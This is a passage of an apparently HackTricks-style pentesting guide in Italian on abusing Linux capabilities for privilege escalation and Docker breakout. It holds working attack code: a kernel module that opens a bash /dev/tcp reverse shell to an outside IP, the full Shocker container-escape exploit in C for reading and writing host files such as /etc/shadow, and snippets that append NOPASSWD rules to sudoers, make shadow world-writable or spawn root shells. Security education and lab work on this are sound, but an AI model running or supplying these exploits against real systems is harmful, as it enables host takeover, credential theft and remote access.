Il che significa che è possibile usare il comando **`insmod`** per inserire un modulo del kernel. Segui l’esempio riportato di seguito per ottenere una **reverse shell** sfruttando questo privilegio.

**Esempio con environment (Docker breakout)**

Puoi verificare le capabilities abilitate all’interno del container Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
All'interno dell'output precedente puoi vedere che la capability **SYS_MODULE** è abilitata.<sup>[[14]](#references)</sup>

**Crea** il **kernel module** che eseguirà una reverse shell e il **Makefile** per **compilarlo**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Il carattere vuoto prima di ogni parola `make` nel Makefile **deve essere una tabulazione, non degli spazi**!

Esegui `make` per compilarlo.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Infine, avvia `nc` all'interno di una shell e **carica il modulo** da un'altra: catturerai la shell nel processo `nc`:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing SYS_MODULE Capability" di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Un altro esempio di questa tecnica è disponibile su [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente a un processo di **bypassare i permessi per la lettura dei file e per la lettura e l'esecuzione delle directory**. Autorizza inoltre `open_by_handle_at(2)`, che interpreta un file handle valido in relazione a un file descriptor di mount per lo stesso filesystem montato. Non espone automaticamente ogni file al di fuori del mount namespace del processo. Un breakout tramite file handle richiede inoltre un riferimento al filesystem rilevante per l'host, handle validi o individuabili, un filesystem e un layout di storage compatibili, nonché l'assenza di blocchi da parte del runtime o dell'LSM. La tecnica storica "Shocker" di Docker ha dimostrato una combinazione di questo tipo nei layout interessati, come analizzato [qui](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Ciò significa che è possibile bypassare i controlli dei permessi di lettura dei file e i controlli dei permessi di lettura/esecuzione delle directory**.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Il binario può leggere i file accessibili nei suoi namespace. Quindi, se un file come `tar` dispone di questa capability, può leggere il file shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Esempio con binary2**

In questo caso, supponiamo che il binario **`python`** disponga di questa capability. Per elencare i file di root, puoi eseguire:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
E per leggere un file potresti fare:
```python
print(open("/etc/shadow", "r").read())
```
**Esempio nell'ambiente (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker usando `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Nel precedente output puoi vedere che la capability **DAC_READ_SEARCH** è abilitata. Questa bypassa i controlli DAC di lettura/ricerca e consente `open_by_handle_at(2)`; di per sé, non è una capability per il debugging dei processi.<sup>[[14]](#references)</sup>

Puoi scoprire come funziona il seguente exploit su [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ma in breve, **CAP_DAC_READ_SEARCH** consente di attraversare il file system senza controlli dei permessi e permette `open_by_handle_at(2)`; ciò può esporre i file aperti da altri processi quando i namespace e i mount pertinenti sono raggiungibili.<sup>[[13]](#references)[[14]](#references)</sup>

L'exploit originale che sfrutta questi permessi per leggere i file dall'host è disponibile qui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); quello seguente è una **versione modificata che consente di passare il file da leggere come primo argomento e di salvare il risultato in un file**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale utilizzava il file /.dockerinit, mentre questa versione modificata utilizza /etc/hostname. Se l'exploit non funziona, potrebbe essere necessario impostare un file diverso. Per trovare un file montato sull'host, è sufficiente eseguire il comando mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale utilizzava il file /.dockerinit, mentre questa versione modificata utilizza...](<../../images/image (407) (1).png>)

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC_READ_SEARCH Capability" di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Questa capability bypassa i controlli sui permessi di lettura e scrittura dei file e la maggior parte dei controlli di esecuzione**; l'esecuzione di un file normale richiede comunque che sia impostato almeno un bit di esecuzione. Non esegue l'override di un mount in sola lettura, di uno stato immutabile o di un diniego da parte di un LSM.<sup>[[14]](#references)</sup>

Cerca i file che diventano leggibili o scrivibili tramite l'appartenenza a un gruppo privilegiato; i target utili dipendono dalla proprietà e dai mode bit del target.<sup>[[14]](#references)</sup>

**Esempio con un binario**

In questo esempio vim dispone di questa capability, quindi puoi modificare qualsiasi file come _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Esempio con il binary 2**

In questo esempio il binary **`python`** avrà questa capability. Potresti usare Python per sovrascrivere qualsiasi file:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Esempio con environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Conferma `CAP_DAC_OVERRIDE` con `capsh --print` come mostrato nell'esempio precedente di environment con `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Prima di tutto, leggi la sezione precedente che [**abusa della capability DAC_READ_SEARCH per leggere file arbitrari**](linux-capabilities.md#cap_dac_read_search) dell'host e **compila** l'exploit.\
Quindi, **compila la seguente versione dell'exploit shocker** che ti consentirà di **scrivere file arbitrari** all'interno del filesystem dell'host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Per **evadere** dal container Docker potresti **scaricare** i file `/etc/shadow` e `/etc/passwd` dall'host, **aggiungervi** un **nuovo utente** e usare **`shocker_write`** per sovrascriverli. Quindi, **accedere** tramite **ssh**.

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC_OVERRIDE Capability" di** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Questa capability consente a un processo di modificare la proprietà dei file**.<sup>[[14]](#references)</sup>

**Esempio con binary**

Supponiamo che il binary **`python`** disponga di questa capability; puoi modificare il proprietario di un file come `shadow`, quindi usare l'accesso ottenuto per modificarlo se le altre autorizzazioni lo consentono:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Oppure con il binario **`ruby`** dotato di questa capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Questa capability aggira i controlli di ownership per molte operazioni sui file, inclusa la modifica dei permessi**.<sup>[[14]](#references)</sup>

**Esempio con binary**

Se python dispone di questa capability, puoi modificare i permessi del file shadow, **cambiare la password di root** ed eseguire privilege escalation:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Questa capability consente a un processo di modificare il proprio user ID effettivo, in base alle regole relative a credenziali e capability applicate dal kernel**.<sup>[[14]](#references)</sup>

**Esempio con binary**

Se python dispone di questa **capability**, puoi abusarne molto facilmente per eseguire una privilege escalation fino a root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Un altro modo:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Questa capability consente a un processo di modificare il proprio group ID effettivo, in base alle regole relative alle credenziali e alle capability applicate dal kernel**.<sup>[[14]](#references)</sup>

Esistono molti file che puoi **sovrascrivere per aumentare i privilegi,** [**puoi trovare alcune idee qui**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Esempio con binary**

In questo caso dovresti cercare file interessanti che un gruppo può leggere, perché puoi impersonare qualsiasi gruppo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una volta trovato un file che puoi sfruttare (tramite lettura o scrittura) per effettuare un'escalation dei privilegi, puoi **ottenere una shell impersonando il gruppo interessante** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In questo caso il gruppo shadow è stato impersonato, quindi puoi leggere il file `/etc/shadow`:
```bash
cat /etc/shadow
```
### Catena combinata: CAP_SETGID + CAP_CHOWN

Quando entrambe le capabilities sono disponibili nello stesso helper, una catena pratica è:

1. Cambiare l'EGID in `shadow` (o in un altro gruppo privilegiato).
2. Usare `chown` su `/etc/shadow` per impostare il proprio UID mantenendo il gruppo `shadow`.
3. Leggere un hash target ed eseguire il crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Questo evita di dover ottenere direttamente i privilegi di root ed è comunemente sufficiente per eseguire un pivot tramite il riutilizzo delle credenziali.

Se è installato **docker**, potresti **impersonare** il **docker group** e abusarne per comunicare con il [**docker socket** e fare privilege escalation](#writable-docker-socket).

## CAP_SETFCAP

**Questa capability consente a un processo di impostare le file capabilities**.<sup>[[14]](#references)</sup>

**Esempio con un binary**

Se Python dispone di questa **capability**, puoi abusarne molto facilmente per ottenere la privilege escalation a root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Un nuovo set di capabilities scritto nel file sostituisce il set precedente; se l'helper viene quindi eseguito con solo le nuove capabilities, potrebbe non conservare più `CAP_SETFCAP` per aggiornare un altro file.<sup>[[14]](#references)[[25]](#references)</sup>

Una volta ottenuta la [SETUID capability](linux-capabilities.md#cap_setuid), puoi andare alla relativa sezione per vedere come effettuare una privilege escalation.

**Esempio con environment (Docker breakout)**

Il capability set predefinito documentato di Docker include **CAP_SETFCAP**, ma il set effettivo dipende dalla configurazione del runtime.<sup>[[19]](#references)</sup>
Puoi verificare le capabilities del processo con:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Questa capability consente di scrivere le capabilities dei file, ma di per sé non concede tali capabilities al processo corrente né aggira le regole relative al file, al bounding set e al namespace applicate quando il file viene eseguito.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Le capability consentite del file sono limitate dal capability bounding set del processo, mentre l'effective bit del file controlla se il suo permitted set viene aggiunto all'effective set del processo. Per questo, aggiungere capability a un file non rende automaticamente utilizzabile ogni capability richiesta al momento dell'esecuzione.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fornisce diverse operazioni sensibili, tra cui l'accesso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, la modifica di `mmap_min_addr`, l'accesso alle system call `ioperm(2)` e `iopl(2)` e vari comandi per i dischi. Anche `FIBMAP ioctl(2)` è abilitato tramite questa capability, causando problemi in [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Come indicato nella man page, consente inoltre al detentore di eseguire una serie di operazioni specifiche del dispositivo su altri dispositivi.<sup>[[14]](#references)</sup>

Questa capability può essere utile per la **privilege escalation** e il **Docker breakout**.<sup>[[14]](#references)</sup>

La capability, da sola, non espone un'interfaccia utile. Un container breakout richiede inoltre un dispositivo o una risorsa dell'host accessibile, autorizzazioni per device-cgroup e filesystem e una tecnica specifica dell'hardware e del kernel. `/dev/mem` in modalità restrittiva, il kernel lockdown, la virtualizzazione, seccomp e le policy LSM rimuovono comunemente i percorsi generici. Verifica prima la capability e la relativa esposizione:
```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
Se `/dev/mem` è l'interfaccia approvata, un laboratorio usa e getta può dimostrare l'esposizione della memoria dei nodi oltre i confini leggendo e calcolando l'hash di un intervallo selezionato dalla mappa hardware di quel laboratorio:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Non indovinare l'intervallo: la lettura di alcune regioni MMIO può avere effetti collaterali e un indirizzo valido su una piattaforma può controllare l'hardware o la memoria del kernel su un'altra. La modifica della memoria del kernel o il controllo dei dispositivi richiedono una prova approvata e specifica per la piattaforma; non esiste un esempio universale sicuro di raw-write.

## CAP_KILL

**Questa capability bypassa i controlli dei permessi per l'invio di signal ai processi nei casi definiti dal kernel**.<sup>[[14]](#references)</sup>

**Esempio con binary**

Supponiamo che il binary **`python`** disponga di questa capability. Se potessi **modificare anche la configurazione di un service o socket** (o qualsiasi file di configurazione relativo a un service), potresti effettuare un backdoor, quindi terminare il processo relativo a quel service e attendere che il nuovo file di configurazione venga eseguito con il tuo backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc con kill**

Se disponi delle capabilities `kill` e c'è un **programma Node in esecuzione come root** (o come un altro utente), probabilmente potresti **inviargli** il **segnale SIGUSR1** e fare in modo che **apra il debugger di Node**, al quale potrai connetterti.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Questa capability consente di effettuare il binding su porte Internet inferiori a 1024.** Non garantisce direttamente un'escalation dei privilegi più ampia.<sup>[[14]](#references)</sup>

**Esempio con un binario**

Se **`python`** dispone di questa capability, sarà in grado di ascoltare su qualsiasi porta e persino di connettersi da essa a qualsiasi altra porta (alcuni servizi richiedono connessioni da porte con privilegi specifici)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente ai processi di **creare socket RAW e PACKET**, permettendo loro di generare e inviare pacchetti di rete arbitrari. Ciò può comportare rischi per la sicurezza negli ambienti containerizzati, come lo spoofing dei pacchetti, l'iniezione del traffico e l'elusione dei controlli di accesso alla rete. Attori malevoli potrebbero sfruttare questa capacità per interferire con il routing del container o compromettere la sicurezza della rete dell'host, soprattutto in assenza di adeguate protezioni firewall. Inoltre, **CAP_NET_RAW** supporta operazioni come il ping tramite richieste ICMP RAW.<sup>[[14]](#references)</sup>

**Ciò può consentire la cattura dei pacchetti con un'interfaccia socket adatta.** Non concede direttamente ulteriori privilegi per la privilege escalation.<sup>[[14]](#references)</sup>

**Esempio con un binary**

Se il binary **`tcpdump`** dispone di questa capability, sarà possibile utilizzarlo per catturare informazioni di rete.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Se l'**environment** concede questa capability, **`tcpdump`** può anche usarla per sniffare il traffico.<sup>[[14]](#references)</sup>

**Esempio con binary 2**

Il seguente esempio è codice **`python2`** che può essere utile per intercettare il traffico dell'interfaccia "**lo**" (**localhost**). Il codice proviene dal laboratorio "_The Basics: CAP-NET_BIND + NET_RAW_" di [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede al possessore la possibilità di **alterare le configurazioni di rete**, incluse le impostazioni del firewall, le tabelle di routing, i permessi dei socket e le impostazioni delle interfacce di rete nel network namespace corrente. Può inoltre abilitare la modalità promiscua su un'interfaccia in quel namespace; ciò può esporre il traffico consegnato a quell'interfaccia, ma non consente di per sé lo sniffing di interfacce arbitrarie in altri network namespace.<sup>[[14]](#references)</sup>

